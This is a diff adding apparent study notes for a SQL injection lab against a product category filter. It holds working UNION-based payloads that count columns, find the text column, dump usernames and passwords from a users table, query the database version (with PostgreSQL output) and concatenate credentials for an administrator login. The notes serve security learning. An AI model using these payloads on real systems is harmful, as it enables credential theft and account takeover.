@@ -1,0 +1,24 @@
+SQL Injection - Product Category Filter
+
+End Goal : Retrieve all usernames, passwords and login as the administrator user
+
+Analysis:
+
+1) Determine # of columns that the vulnerable query is using
+' order by #-- where # changes iteratively
+Burpsuite Check : 2 columns are found
+
+2) Find column containing text
+' UNION SELECT 'a', NULL--
+Burpsuite Check : 2nd Column accepts text. 
+Hence, the query will be ' UNION SELECT NULL, 'a'--
+
+3) Output the data from other tables
+' UNION SELECT NULL, username from users--
+' UNION SELECT NULL, password from users-- 
+
+Find the database version
+'UNION SELECT NULL, version()--
+--> PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
+
+SQLi Query : 'UNION SELECT NULL, username || '-' || password from users--
